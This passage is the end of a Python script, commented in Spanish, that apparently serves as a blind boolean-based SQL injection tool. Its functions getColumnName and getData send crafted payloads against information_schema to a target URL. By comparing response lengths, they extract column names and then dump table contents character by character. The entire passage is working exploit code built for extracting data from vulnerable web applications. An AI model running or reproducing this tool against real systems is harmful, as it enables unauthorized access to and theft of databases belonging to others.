            quit()
    
    # Si no se ha encontrado el número de columnas mostramos el aviso
    print(YELLOW + "[AVISO]" + RESET + " No se ha obtenido el número de columnas de la tabla " + params[PARAMS_TABLE]["value"] + ". Prueba a aumentar el max-iter, o puede que no hayas introducido correctamente la tabla.")
    quit()

"""
    Nombre: Get Column Name
    Descripción: Función con la que obtenemos los nombres de las columnas
    Parámetros: Ninguno.
    Retorno: Ninguno.
    Precondición: La URL debe ser correcta y el parámetro vulnerable, la base de datos a atacar, la tabla a atacar y los números de las columnas deben ser correctos
    Complejidad Temporal: O(n) n -> Cantidad de columnas
    Complejidad Espacial: O(n) n -> Cantidad de columnas
"""
def getColumnName():

    # Variables necesarias
    exploitStart = ""
    exploit = ""
    iters = 0
    falseContentLength = 0
    contentLength = 0
    columnNameLength = 0
    columnName = ""
    columnNames = []
    table = None
    tableRow = []

    # Comprobamos que el parámetro sea vulnearble y que el usuario nos haya introducido la base de datos y la tabla a atacar
    if not checkIsVulnerable() or not checkDatabase() or not checkTable():
        quit()
    
    # Inicializamos el exploit en función del tipo de vulnerabilidad
    exploitStart = setExploitStart()

    # Comprobamos el estado de max-iter
    iters = setIters()

    # Obtenemos el Content-Length de un caso false
    falseContentLength = getFalseContentLength(exploitStart)

    # Ejecutamos el exploit para obtener los nombres de las columnas
    print(CYAN + "[INFO]" + RESET + " Iniciando exploit para la obtención de los nombres de las columnas...")

    try:
        # Recorremos la lista de columnas a obtener
        for columnNumber in params[PARAMS_GET_COLUMN_NAME]["value"]:

            # Obtenemos la longitud del nombre de la columna
            print(CYAN + "[INFO]" + RESET + " Obteniendo la longitud del nombre de la columna " + str(columnNumber) + "...")

            columnNameLength = 0

            for i in range(1, iters + 1):
                # Ejecutamos el exploit
                exploit = exploitStart + "and (select length(column_name) from information_schema.columns where table_name='" + params[PARAMS_TABLE]["value"] + "' limit " + str(columnNumber - 1) + ",1)=" + str(i) + ") -- -"
                try:
                    contentLength = len(requests.get(params[PARAMS_URL]["value"] + exploit).text)
                except:
                    print(RED + "ERROR:" + RESET + " No se ha podido realizar la petición al servidor.")

                # Comprobamos el content length
                if contentLength != falseContentLength:
                    columnNameLength = i
                    print(GREEN + "[ÉXITO]" + RESET + " Encontrados " + YELLOW + str(columnNameLength) + RESET + " carácteres para el nombre de la columna con número " + YELLOW + str(columnNumber) + RESET + ".")
                    break
            
            # Obtenemos el nombre de la columna mediante fuerza bruta
            print(CYAN + "[INFO]" + RESET + " Obteniendo el nombre de la columna " + str(columnNumber) + "...")

            columnName = ""

            # Recorremos todas las posiciones del nombre
            for pos in range(1, columnNameLength + 1):
                # Recorremos todos los carácteres
                for char in ALL_CHARS:
                    # Ejecutamos el exploit
                    exploit = exploitStart + "and ascii(substring((select column_name from information_schema.columns where table_name='" + params[PARAMS_TABLE]["value"] + "' limit " + str(columnNumber - 1) + ",1)," + str(pos) + ",1))=" + str(ord(char)) + ") -- -"
                    try:
                        contentLength = len(requests.get(params[PARAMS_URL]["value"] + exploit).text)
                    except:
                        print(RED + "ERROR:" + RESET + " No se ha podido realizar la petición al servidor.")

                    # Comprobamos el content length
                    if contentLength != falseContentLength:
                        columnName = columnName + char
                        break
            
            # Mostramos el nombre de la columna encontrado
            print(GREEN + "[ÉXITO]" + RESET + " Obtenido el nombre de la columna con número " + str(columnNumber) + ": " + YELLOW + columnName + RESET + "\n")
            columnNames.append({
                "number": columnNumber,
                "element": columnName
            })
        
        # Mostramos las columnas encontradas
        print("----- COLUMNAS ENCONTRADAS -----")

        table = PrettyTable()
        table.align = "l"
        table.field_names = ["Nº Columna", "Nombre Columna"]

        for col in columnNames:
            tableRow = [col["number"], col["element"]]
            table.add_row(tableRow)
        
        print(table)

    except:
        print(RED + "ERROR:" + RESET + " No se ha podido ejecutar el exploit correctamente, comprueba que los números de las columnas son correctos.")

"""
    Nombre: Get Data
    Descripción: Función con la que volcamos el contenido de las columnas de una tabla
    Parámetros: Ninguno.
    Retorno: Ninguno.
    Precondición: La URL debe ser correcta y el parámetro vulnerable, la base de datos, tabla y columnas a atacar deben ser correctas
    Complejidad Temporal: O(n * m) n -> Cantidad de columnas a volcar / m -> Cantidad de filas de la tabla
    Complejidad Espacial: O(n * m) n -> Cantidad de columnas a volcar / me -> Cantidad de filas de la tabla
"""
def getData():

    # Variables necesarias
    exploitStart = ""
    exploit = ""
    iters = 0
    falseContentLength = 0
    contentLength = 0
    columnsToAttack = []
    rowsNumber = 0
    dataLength = 0
    dataValue = ""
    dataRow = {}
    dataDict = []
    table = None
    tableRow = []

    # Comprobamos que el parámetro sea vulnerable y nos hayan introducido base de datos y la tabla
    if not checkIsVulnerable() or not checkDatabase() or not checkTable():
        quit()
    
    # Inicializamos el exploit en función del tipo de vulnerabilidad
    exploitStart = setExploitStart()

    # Comprobamos el estado de max-iter
    iters = setIters()

    # Obtenemos el Content-Length de un caso false
    falseContentLength = getFalseContentLength(exploitStart)

    # Obtenemos las columnas de las que extraer la información
    try:
        columnsToAttack = params[PARAMS_GET_DATA]["value"].split(",")
    except:
        print(RED + "ERROR:" + RESET + " No se ha podido interpretar correctamente el nombre de las columnas a atacar.")

    # Inicializamos el exploit para la obtención de los datos de las columnas
    print(CYAN + "[INFO]" + RESET + " Iniciando exploit para la obtención de los datos de la tabla...")

    try:

        # Obtenemos la cantidad de filas de la tabla
        print(CYAN + "[INFO]" + RESET + " Obteniendo la cantidad de filas de la tabla " + params[PARAMS_TABLE]["value"] + "...")

        for i in range(0, iters + 1):
            # Ejecutamos el exploit
            exploit = exploitStart + "and (select count(" + columnsToAttack[0] + ") from " + params[PARAMS_DATABASE]["value"] + "." + params[PARAMS_TABLE]["value"] + ")=" + str(i) + ") -- -"
            try:
                contentLength = len(requests.get(params[PARAMS_URL]["value"] + exploit).text)
            except:
                print(RED + "ERROR:" + RESET + " No se ha podido realizar la petición al servidor.")

            # Comprobamos el content length
            if contentLength != falseContentLength:
                rowsNumber = i
                print(GREEN + "[ÉXITO]" + RESET + " Encontradas " + YELLOW + str(i) + RESET + " filas en la tabla: " + YELLOW + params[PARAMS_TABLE]["value"] + RESET)
        
        # Comprobamos que hemos obtenido las filas
        if rowsNumber == 0:
            print(YELLOW + "[AVISO]" + RESET + " No se ha obtenido la cantidad de filas. Prueba a aumentar el max-iter, puede que los datos estén mal introducidos o puede que la tabla esté vacía.")
            quit()
        
        # Obtenemos los datos de las filas
        print(CYAN + "[INFO]" + RESET + " Obteniendo datos de las filas...")

        # Por cada fila
        for row in range(0, rowsNumber):
            
            dataRow = {}

            # Para cada columna de la fila
            for col in columnsToAttack:

                dataLength = 0

                # Obtenemos la longitud del dato
                for i in range(1, iters + 1):
                    # Ejecutamos el exploit
                    exploit = exploitStart + "and (select length(" + col + ") from " + params[PARAMS_DATABASE]["value"] + "." + params[PARAMS_TABLE]["value"] + " limit " + str(row) + ",1)=" + str(i) + ") -- -"
                    try:
                        contentLength = len(requests.get(params[PARAMS_URL]["value"] + exploit).text)
                    except:
                        print(RED + "ERROR:" + RESET + " No se ha podido realizar la petición al servidor.")

                    # Comprobamos el content length
                    if contentLength != falseContentLength:
                        dataLength = i
                        break
                
                dataValue = ""
                
                # Obtenemos el dato por fuerza bruta
                for pos in range(1, dataLength + 1):
                    for char in ALL_CHARS:
                        # Ejecutamos el exploit
                        exploit = exploitStart + "and ascii(substring((select " + col + " from " + params[PARAMS_DATABASE]["value"] + "." + params[PARAMS_TABLE]["value"] + " limit " + str(row) + ",1)," + str(pos) + ",1))=" + str(ord(char)) + ") -- -"
                        try:
                            contentLength = len(requests.get(params[PARAMS_URL]["value"] + exploit).text)
                        except:
                            print(RED + "ERROR:" + RESET + " No se ha podido realizar la petición al servidor.")

                        # Comprobamos el content length
                        if contentLength != falseContentLength:
                            dataValue = dataValue + char
                            break
                
                # Agregamos el dato al array de datos de la fila
                dataRow[col] = dataValue
            
            # Agregamos la fila de datos al diccionario de la tabla
            dataDict.append(dataRow)

            print(GREEN + "[ÉXITO]" + RESET + " Datos de la fila obtenidos (" + YELLOW + str(row + 1) + RESET + "/" + YELLOW + str(rowsNumber) + RESET + ")")
        
        # Mostramos los datos obtenidos
        print("\n----- CONTENIDO DE LA TABLA '" + params[PARAMS_TABLE]["value"] + "' -----")

        table = PrettyTable()
        table.align = "l"
        table.field_names = columnsToAttack

        for element in dataDict:
            tableRow = []
            for col in columnsToAttack:
                tableRow.append(element[col])
            table.add_row(tableRow)
        
        print(table)

    except:
        print(RED + "ERROR:" + RESET + " No se ha podido ejecutar el exploit correctamente, comprueba que los datos introducidos son correctos.")

# ========== Ejecución Principal ==========
main()